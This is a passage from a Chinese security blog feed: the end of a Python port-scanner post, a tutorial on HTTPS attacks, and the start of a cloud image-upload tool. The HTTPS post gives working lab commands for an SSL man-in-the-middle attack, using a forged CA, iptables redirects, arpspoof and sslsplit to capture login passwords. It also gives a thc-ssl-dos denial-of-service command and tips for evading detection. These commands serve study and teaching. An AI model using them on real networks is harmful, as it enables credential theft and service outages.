class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ping</span><span class="params">(self, Port)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> OpenPort, lock, Timeout</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(Timeout)</span><br><span class="line">        address = (self.IP, Port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">            ready = select.select([sock],[],[],<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            OpenPort.append(str(Port))</span><br><span class="line">            ScanIP_list.append(self.IP)</span><br><span class="line">            <span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  +sock.recv(<span class="number">4096</span>)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  + <span class="string">"Unknow!\n"</span></span><br><span class="line">                sock.close()</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure></li><li><p>通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.SingleQueue.empty():</span><br><span class="line">            p = self.SingleQueue.get()</span><br><span class="line">            self.Ping(p)</span><br></pre></td></tr></table></figure></li><li><p>调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_port</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> PortList</span><br><span class="line">        PortList = []</span><br><span class="line">        ListTmp = argv.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ListTmp:</span><br><span class="line">            <span class="keyword">if</span> port.find(<span class="string">".."</span>) &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit():</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                PortList.append(int(port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RangeLst = port.split(<span class="string">".."</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (RangeLst[<span class="number">0</span>].isdigit() <span class="keyword">and</span> RangeLst[<span class="number">1</span>].isdigit()):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(int(RangeLst[<span class="number">0</span>]), int(RangeLst[<span class="number">1</span>])):</span><br><span class="line">                    PortList.append(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_scan</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">global</span> nThread, PortList, strIP, ScanIP_list, OpenPort</span><br><span class="line">        <span class="keyword">del</span> ScanIP_list[:]</span><br><span class="line">        <span class="keyword">del</span> OpenPort[:]</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strIP = socket.gethostbyname(str(argv))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        SingleQueue = GetQueue(PortList)</span><br><span class="line">        <span class="keyword">if</span> PortList != <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, nThread):</span><br><span class="line">                t = ScanThreadSingle(strIP, SingleQueue)</span><br><span class="line">                ThreadList.append(t)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_ping</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> commandargs</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        commandargs = str(argv)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Input is %s "</span> % commandargs + <span class="string">'\n'</span></span><br><span class="line">        args = <span class="string">""</span>.join(commandargs)</span><br><span class="line">        ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip = <span class="string">'%s.%s'</span> % (ip_prefix,i)</span><br><span class="line">            s = PING(ip)</span><br><span class="line">            ThreadList.append(s)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.start()</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure></li><li><p>这些就是整个程序中核心的几个模块，具体代码请看源码。</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;程序运行实例&quot;&gt;&lt;a href=&quot;#程序运行实例&quot; class=&quot;he
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.xyz/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS攻击</title>
    <link href="https://www.lsowl.xyz/2018/06/13/HTTPS%E6%94%BB%E5%87%BB/"/>
    <id>https://www.lsowl.xyz/2018/06/13/HTTPS攻击/</id>
    <published>2018-06-13T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.215Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的加密都是可以破解的，前提就是看你是否接受这个成本。目前全站HTTPS的应用已经很广泛了，如百度、淘宝等。</p></blockquote><h3 id="HTTPS及其相关知识"><a href="#HTTPS及其相关知识" class="headerlink" title="HTTPS及其相关知识"></a>HTTPS及其相关知识</h3><ul><li>HTTPS的作用<ul><li>CIA(信息安全三要素：机密性、完整性、可用性（HTTPS中是合法用户可以访问权限以内的资源）)</li><li>解决的是信息在传输过程中数据被篡改、窃取</li><li>加密：对称、非对称、单向</li></ul></li><li>HTTPS攻击方法<ul><li>降级攻击（HTTPS加密套件是多种加密方式，强制采用低强度的加密方式）</li><li>解密攻击（明文、证书伪造）</li><li>协议漏洞、实现方法的漏洞、配置不严格（漏洞来源的角度）</li></ul></li><li>SSL（全称Secure socket layer）<ul><li>保证网络通信安全的加密协议</li><li>TLS取代SSL v3(由于SSL协议漏洞使得大家认为其漏洞不可软件修复）<ul><li>Heartbleed</li><li>POODLE</li><li>BEAST</li></ul></li></ul></li><li>SSL/TLS用于其他场景的传输通道加密<ul><li>邮件传输（服务器间、客户端与服务期间）</li><li>数据库服务器间的通信</li><li>LDAP身份认证服务器间的通信</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul></li><li>WEB通信中的SSL加密<ul><li>公钥证书（受信任的第三方证书颁发机构签名颁发）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527423473.6.png" alt=""></li><li>Versign</li><li>Thawte</li><li>Globalsign</li><li>Symantec</li></ul></li><li>加密过程<ul><li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li></ul></li><li>常见的加密算法<ul><li>非对称加密算法（适合加密少量的数据）<ul><li>Diffie-Hellman key exchange</li><li>RSA</li><li>ECC</li></ul></li><li>对称加密算法（适合加密大量的数据）<ul><li>DES / 3DES</li><li>AES （主流对称加密算法）</li><li>IDEA</li><li>RC4（生命周期短）<ul><li>WEP、TLS/SSL、RDP、secure shell</li></ul></li></ul></li><li>单向加密算法（hash）<ul><li>MD5</li><li>SHA-1  、 SHA-2</li></ul></li><li>SHA-2是TLS1.2唯一支持的单向加密算法</li><li>碰撞攻击针对单向加密算法（两个不同的文件生成相同的hash值）</li></ul></li><li>SSL的弱点<ul><li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（加密套件）</li><li>服务器端为了提供更好的兼容性，选择支持大量过时的cipher suite</li><li>协商过程中强迫降级加密强度</li><li>现代处理器计算能力可以在可接受的时间内破解过时加密算法（使用云计算）</li></ul></li></ul><h3 id="HTTPS实践"><a href="#HTTPS实践" class="headerlink" title="HTTPS实践"></a>HTTPS实践</h3><h4 id="在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息"><a href="#在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息" class="headerlink" title="在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息"></a>在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息</h4><ul><li>openssl(用户层的一个操作系统命令，直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite)</li><li>使用OpenSSL连接探测 <code>openssl s_client -connect www.baidu.com:443</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527425145.38.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527425231.87.png" alt=""></li><li>探测目标站点是否支持不安全的加密套件 <code>openssl s_client -tls1_2 -cipher &#39;NULL,EXPORT,LOW,DES&#39; -connect www.baidu.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426134.54.png" alt=""></li><li>通过OpenSSL查看不安全的加密套件 <code>openssl ciphers -v &#39;NULL,EXPORT,LOW,DES&#39;</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426259.37.png" alt=""></li><li>使用SSLScan识别<ul><li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li><li>默认检测CRIME、heartbleed漏洞</li><li>测试支持TLS_1.2: <code>sslscan --tlsall www.taobao.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426631.26.png" alt=""></li><li>分析证书的详细信息 <code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426784.44.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426802.79.png" alt=""></li></ul></li><li>SSLyze探测<ul><li>Python编写</li><li>检测SSL过时版本、存在弱点的cipher suite、是否支持会话恢复</li><li><code>sslyze --regular www.taobao.com</code>   进行信息的探测<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527427068.09.png" alt=""></li></ul></li><li>nmap脚本探测： <code>sudo nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></li><li>第三方网站扫描： <code>www.ssllabs.com/ssltest</code></li></ul><h3 id="实际攻击的一些方法"><a href="#实际攻击的一些方法" class="headerlink" title="实际攻击的一些方法"></a>实际攻击的一些方法</h3><p>SSL/TLS中间人攻击（攻击者位于客户端和服务器通信链路中，中间人伪造证书进行加解密进行流量劫持）</p><blockquote><p>这里举个例子，在我们使用代理工具的时候会在浏览器上面设置代理，但在真正的生产环境中我们是不可能将目标的浏览器代理设置为我们的地址，所以就要用到以下的方法</p></blockquote><ul><li><p>ARP欺骗（最常用的中间人攻击方式）</p></li><li><p>DHCP（四步过程中的第一步一定是广播，谁先相应先给谁确认）</p></li><li><p>修改网关（手动修改，理论上成立，在现实环境中很难实现）</p></li><li><p>修改DNS</p></li><li><p>修改HOSTS（手动修改的这几个在生产环境中实现的条件非常苛刻）</p></li><li><p>ICMP、STP（交换树协议，避免逻辑环路，实现高可用）、OSPF（攻击者和被攻击者出于同一个局域网可以通过攻击一些网络协议）</p></li><li><p>通过伪造CA证书实现SSL中间人攻击的原理图：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527511235.02.png" alt=""></p></li><li><p>实现SSL中间人攻击的前提（如果SSL中间人攻击以后客户端不提示一些告警信息，用户是很难发现被攻击的）</p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了合法的证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul></li><li><p>SSLsplit（只需要在攻击者的机器上配置好以后就可以实现对经过的流量解密，也称为HTTPS降级攻击）</p><ul><li><p>透明的SSL/TLS中间人攻击工具</p></li><li><p>对客户端伪装成服务器，对服务器伪装成普通客户端</p></li><li><p>伪装服务器需要伪造证书（这里就需要在本地生成一张伪造证书）</p></li><li><p>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击（不仅限于https解密）</p></li><li><p>攻击原理：</p><blockquote><p>监听https流量，更改重定向连接中的location，替换https为http并记录；更改响应内容中的超链接，替换https为http并记录；与用户进行http通信、与服务器进行https通信（记录中本应该是https的请求），从而获取用户信息。</p></blockquote><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512349.78.png" alt=""></p></li></ul></li><li><p>使用openssl伪造中间人的证书：</p><ul><li>使用OpenSSL生成证书私钥：<code>openssl genrsa -out ca.key 2048</code>  现在主要使用的就是2048或4096位<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512630.43.png" alt=""></li><li>利用私钥签名生成证书： <code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code> （这个证书就是伪造的中间人的根证书，伪造信息的时候仅可能的真实）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512950.23.png" alt=""></li><li>这里生成的根证书会被sslsplit调用生成通信的证书</li></ul></li><li><p>开启中间人机器的路由功能（实现真正的路由转发，相当于一个路由器）</p><p> <code>sudo sysctl -w net.ipv4.ip_forward=1</code></p><p>  修改的文件在 <code>/proc/sys/net/ipv4/ip_forward</code></p></li><li><p>配置iptables规则实现端口转发调用证书：（因为sslsplit工作在特定的端口上）</p><ul><li><p>查看80、443端口是否被占用 <code>netstat -pantu | grep 80</code>    <code></code>netstat -pantu | grep 443`</p></li><li><p>查看当前防火墙中的nat规则 <code>sudo iptables -t nat -L</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527513961.96.png" alt=""></p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">80端口重定向到8080端口</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">443端口重定向到8443端口</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">将邮件提交代理（MSA）、SMTPS、IMAPS、POP3S重定向到8443端口(可以将加密的流量都转发)</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用一台WIN7的虚拟机进行arp欺骗： <code>sudo arpspoof -i ens33 -t 192.168.240.131 -r 192.168.240.2</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527514767.14.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527514837.89.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527515026.14.png" alt=""></p></li><li><p>查看win7的Mac地址发现已经被欺骗<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527515119.57.png" alt=""></p></li><li><p>开启sslsplit监听端口（sslsplit的作用是调用伪造证书服务器根证书(ca.crt)针对不同网站签发不同的证书，比如：针对百度伪造类似百度的证书，针对淘宝伪造类似淘宝的证书 ）</p><ul><li>建立一个数据存放目录： <code>mkdir -p test1/logdir</code></li><li><code>sudo sslsplit -D -l connect.log -j /home/toml/test1/ -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code>   可以看到生成证书的内容<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527516265.08.png" alt=""></li></ul></li><li><p>当被劫持的客户端访问一些做了https的网站，比如淘宝，客户端输入的一些数据经过sslsplit就会被降级解密，理论上是这样，但是现在出现一个尴尬的情况：开启流量转发后arp欺骗也成功了，结果客户端不能正常访问页面。通过分析是https降级失败。</p></li><li><p>重新进行了https降级，客户端访问页面出现证书不受信任的警告：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527574568.92.png" alt=""></p></li><li><p>在客户端访问做了全站https的淘宝并模拟登陆：（并在logdir目录下查看传输数据的记录）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527574721.05.png" alt=""></p></li><li><p>匹配输入账号密码的字符 <code>sudo grep 123123 *</code>  并查看文件，发现数据都可以明文查看到<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527575040.21.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527575164.97.png" alt=""></p></li><li><p>HTTPS结合伪造证书降级攻击成功，如果是在真实环境中，为了完美的攻击，可以将伪造的根证书传到客户端浏览器上，这样客户端就不会提示告警信息了。</p></li></ul><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h3><blockquote><p>由于SSL在正式加密通信之前，会进行一个协商的机制，协商使用哪种加密套件等，协商成功以后建立SSL的通信，在这个过程中会产生大量的连接，在一定程度上https对会增大服务器的开销。</p></blockquote><ul><li>thc-ssl-dos（一个ssl dos工具，利用的SSL的安全重连接的特性，打死的不是带宽，而是服务器的资源，产生的流量很小，但是效果却很好）<ul><li>SSL协商加密对性能开销增大，大量握手请求会造成拒绝服务</li><li>利用SSL secure Renegotiation特性，<strong>在单一TCP连接中生成数千个SSL连接请求</strong>，造成服务器资源过载</li><li>与流量式拒绝服务(占用所有的带宽)攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次/秒SSL握手请求</li><li>对SMTPS、POP3S等服务同样有效</li><li>thc-ssl-dos 199.233.209.205 2083 –accept</li></ul></li><li>对策<ul><li>禁用SSL-Renegotiation、使用SSL Accelerator</li><li>测试网站是否禁用了SSL-Renegotiation <code>openssl s_client -connect</code></li><li>通过修改thc-ssl-dos代码，可以绕过以上对策</li></ul></li></ul><h3 id="web其他知识点补充"><a href="#web其他知识点补充" class="headerlink" title="web其他知识点补充"></a>web其他知识点补充</h3><ul><li>AJAX<ul><li>Asynchronous JavaScript and XML</li><li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li><li>通过客户端脚本动态更新页面部分内容，而非整个页面</li><li>降低带宽使用，提高速度</li><li>提升用户体验</li><li>后台异步访问</li></ul></li><li>AJAX组件<ul><li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口像服务器发起请求，接收并处理服务器响应数据</li></ul></li><li>DHTML<ul><li>早于AJAX出现，通过JavaScript、css等在客户端修改HTML页面element，缺点是完全依赖于客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了它的缺点（注册用户）</li></ul></li><li>DOM<ul><li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的properties、method、event</li></ul></li><li>基于AJAX的WEB应用工作流程<ul><li>XMLHTTPRequest API创建对象xmlhttp进行访问</li><li>xml、json、HTML、文本、图片</li><li>多个异步请求独立通信，互不依赖</li><li>AJAX框架<ul><li>JQuery</li><li>Dojo Toolkit</li><li>Google web tookit(GWT)</li><li>microsoft AJAX library</li></ul></li></ul></li><li>AJAX攻击面不为大多数人所知</li><li>AJAX的安全问题<ul><li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li><li>AJAX引擎是个权功能的解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过</li><li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li><li>暴露应用程序逻辑</li></ul></li><li>AJAX对渗透测试的挑战<ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏</li></ul></li><li>AJAX爬网工具<ul><li>OWASP_ZAP（在攻击模块中）</li></ul></li><li>客户端代码审计<ul><li>源码</li><li>firebug  / f12 中的XHR</li></ul></li><li>WEB SERVICE<ul><li>面向服务的架构，便于不同系统集成共享数据和功能</li><li>尤其适合不想暴露数据模和程序逻辑而访问数据的场景</li><li>无页面</li></ul></li><li>两种类型的WEB service<ul><li>SOAP<ul><li>传统的web service 开发方法，xml是唯一的数据交换格式</li><li>要求安全性的应用更多采用</li></ul></li><li>RESTFUL<ul><li>更多被采用的轻量web service,JSON是数据交换格式</li></ul></li></ul></li><li>WEB service安全考虑<ul><li>使用的api key或session token实现和跟踪身份认证</li><li>身份认证有服务器完成，而非客户端</li><li>API key、用户名、session token永远不要通过URL发送</li><li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li><li>SOPA提供提供强于HTTPS的WS-security机制（在传输层实现数据加密）</li><li>使用OAuth 或 HMAX进行身份验证，HMAX身份认证使用C/S共享密钥加密API KEY</li><li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li><li>使用随机token防止CSRF攻击</li><li>对用户提交参数过滤，建议部署基于严格白名单的方法</li><li>报错信息消毒</li><li>直接对象引用应严格身份验证（电商公司已ID作为主索引）</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全" scheme="https://www.lsowl.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="parrot" scheme="https://www.lsowl.xyz/tags/parrot/"/>
    
      <category term="渗透测试" scheme="https://www.lsowl.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云OSS智能上传图床</title>
    <link href="https://www.lsowl.xyz/2018/06/13/%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A/"/>
    <id>https://www.lsowl.xyz/2018/06/13/阿里云OSS储存智能上传图床/</id>
    <published>2018-06-13T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。</p></blockquote><h2 id="程序流程图如下："><a href="#程序流程图如下：" class="headerlink" title="程序流程图如下："></a>程序流程图如下：</h2><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/77366569.jpg" alt=""></p><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"><a href="#图片截图以后，从粘贴板获取图片保存到本地Image文件夹下" class="headerlink" title="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"></a>图片截图以后，从粘贴板获取图片保存到本地Image文件夹下</h3><ul><li><p>使用win32clipboard，win32con，PIL模块</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> w</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageGrab</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure></li></ul><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">im = ImageGrab.grabclipboard()      <span class="comment">#从粘贴板获取内容</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(im,Image.Image):      <span class="comment">#判断是不是图片</span></span><br><span class="line">            name = str(time.time()) + <span class="string">".png"</span></span><br></pre></td></tr></table></figure></li><li><p>获取到图片以后判断是否为图片然后保存到本地</p></li><li><p>这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存</p></li></ul><h3 id="将图片上传以后的生成的访问地址添加到粘贴板"><a href="#将图片上传以后的生成的访问地址添加到粘贴板" class="headerlink" title="将图片上传以后的生成的访问地址添加到粘贴板"></a>将图片上传以后的生成的访问地址添加到粘贴板</h3><ul><li><p>使用win32clipboard，win32con模块</p></li><li><figure class="highlight 